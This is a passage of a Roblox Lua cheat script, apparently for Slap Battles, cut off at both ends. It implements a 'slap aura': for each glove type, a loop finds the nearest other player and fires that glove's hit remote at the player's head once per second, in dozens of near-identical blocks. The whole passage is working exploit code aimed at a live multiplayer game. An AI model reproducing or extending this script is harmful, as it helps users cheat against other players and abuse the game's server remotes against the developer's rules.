                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("HtSpace"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Boomerang" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("BoomerangH"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Speedrun" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("Speedrunhit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Mail" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("MailHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "T H I C K" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Golden" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GoldenHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Squid" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "MR" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("MisterHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Reaper" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("ReaperHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Replica" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("ReplicaHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Defense" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("DefenseHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Killstreak" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("KSHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Reverse" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("ReverseHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Shukuchi" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("ShukuchiHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Duelist" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("DuelistHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                             elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Woah" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("woahHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Ice" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("IceHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Gummy" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Adios" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("hitAdios"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Blocked" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("BlockedHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Divert" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Engineer" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("engiehit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Rocky" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("RockyHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Coil" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("HtStun"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Conveyor" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("ConvHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Balloony" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("HtStun"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Phantom" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("PhantomHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Wormhole" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("WormHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "STOP" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("STOP"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Track" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Tableflip" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Shield" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Booster" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
                 if distance < shortestDistance then
                           shortestDistance = distance
                              nearestPlayer = player
                            end
                        end
                    end

                    return nearestPlayer
                end

                local nearestPlayer = FindNearestPlayer()

                if nearestPlayer then
                    local args = {
                        [1] = nearestPlayer.Character.Head
                    }

         game:GetService("ReplicatedStorage"):WaitForChild("GeneralHit"):FireServer(unpack(args))
                else
                    print("Nenhum jogador próximo encontrado.")
                end
                wait(1) -- Esperar por 1 segundo
                      end
                                                   elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Ping Pong" then
                      while _G.SlapAura do
        local function FindNearestPlayer()
                local players = game:GetService("Players"):GetPlayers()
                local nearestPlayer = nil
                 local shortestDistance = math.huge
              local currentPlayer = game:GetService("Players").LocalPlayer

                for _, player in ipairs(players) do
                    if player ~= currentPlayer then
                 local distance = (player.Character.HumanoidRootPart.Position - currentPlayer.Character.HumanoidRootPart.Position).magnitude
